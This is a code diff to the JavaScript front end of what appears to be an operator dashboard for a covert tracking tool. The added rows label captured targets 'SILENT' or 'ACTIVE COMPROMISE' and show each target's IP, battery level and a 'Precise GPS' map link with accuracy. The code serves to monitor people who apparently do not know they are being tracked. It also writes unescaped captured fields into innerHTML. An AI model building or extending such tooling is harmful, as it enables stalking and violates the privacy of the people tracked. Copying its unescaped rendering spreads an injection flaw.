@@ -51,16 +51,25 @@ document.addEventListener('DOMContentLoaded', () => {
 
                     // Parse Platform
                     let platStr = meta.platform || 'Unknown';
+                    
+                    const statusHtml = entry.status === 'SILENT_CAPTURE' 
+                        ? '<span style="color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem;">SILENT</span>'
+                        : '<span style="color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold;">ACTIVE COMPROMISE</span>';
+
+                    let locStr = '<span style="color: #64748b; font-size: 0.85rem;">IP Only</span>';
+                    if (entry.location) {
+                        locStr = `<a href="https://www.google.com/maps?q=${entry.location.lat},${entry.location.lon}" target="_blank" style="color: #38bdf8; text-decoration: none; font-size: 0.9rem;" title="Accuracy: ${Math.round(entry.location.accuracy)}m"><i class="fa-solid fa-location-dot"></i> Precise GPS</a>`;
+                    }
 
                     const row = document.createElement('tr');
                     row.className = 'new-entry'; // Triggers CSS animation highlight
                     row.innerHTML = `
                         <td title="${entry.timestamp}">${timeStr}</td>
-                        <td style="color: #ef4444;">${entry.ip}</td>
+                        <td style="color: #cbd5e1; font-weight: bold;">${entry.ip}</td>
+                        <td>${statusHtml}</td>
                         <td title="${meta.userAgent || ''}">${browserStr}</td>
-                        <td>${meta.screenSize || 'N/A'}</td>
-                        <td>${meta.language || 'N/A'}</td>
-                        <td>${platStr}</td>
+                        <td style="color: #a3e635;">${meta.battery || 'Unknown'}</td>
+                        <td>${locStr}</td>
                     `;
                     
                     // Prepend to top
